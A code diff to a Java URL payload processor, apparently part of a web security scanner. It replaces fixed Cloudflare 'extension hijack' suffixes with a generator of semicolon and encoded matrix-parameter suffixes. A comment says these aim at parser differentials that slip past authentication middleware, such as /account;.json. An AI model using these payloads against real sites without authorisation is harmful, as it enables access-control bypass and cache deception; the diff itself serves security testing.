@@ -423,22 +423,51 @@ public class UrlPayloadProcessor {
             "/.png",
             "/.gif",
             "/.css",
-            "/.js",
-            // Cloudflare matrix-param extension hijack.
-            ";.jpeg",
-            ";.jpg",
-            ";.css",
-            ";.js"
+            "/.js"
         );
 
         Set<String> allSuffixes = new LinkedHashSet<>(baseSuffixes);
+        allSuffixes.addAll(generateMatrixFormatSuffixes());
 
         // Deterministic case expansion (was: 3 random variants per suffix)
-        for (String suffix : baseSuffixes) {
+        for (String suffix : new ArrayList<>(allSuffixes)) {
             allSuffixes.addAll(expandSegmentCase(suffix));
         }
 
         return new ArrayList<>(allSuffixes);
+    }
+
+    private List<String> generateMatrixFormatSuffixes() {
+        Set<String> suffixes = new LinkedHashSet<>();
+
+        // Matrix/content-negotiation suffixes. These target parser
+        // differentials where auth middleware sees an asset/API format suffix
+        // but the framework strips semicolon path parameters before routing,
+        // e.g. /account;.json dispatches to /account.
+        for (String extension : loadExtensionSuffixes()) {
+            suffixes.add(";" + extension);
+            suffixes.add("%3b" + extension);
+            suffixes.add(extension + ";");
+            suffixes.add(extension + ";jsessionid=1");
+            suffixes.add(extension + ";foo=bar");
+        }
+
+        return new ArrayList<>(suffixes);
+    }
+
+    private List<String> loadExtensionSuffixes() {
+        Set<String> extensions = new LinkedHashSet<>();
+        try {
+            PayloadLoader.loadPayloads("extension_payloads.txt").stream()
+                .filter(extension -> extension != null && !extension.isBlank())
+                .map(String::trim)
+                .map(extension -> extension.startsWith(".") ? extension : "." + extension)
+                .forEach(extensions::add);
+        } catch (RuntimeException e) {
+            extensions.addAll(List.of(".json", ".html", ".xml", ".txt", ".php"));
+        }
+        extensions.addAll(List.of(".jpeg", ".jpg", ".png", ".gif", ".css", ".js"));
+        return new ArrayList<>(extensions);
     }
 
     private List<String> convertPathsToUrls(List<String> paths, List<String> suffixPayloads) {
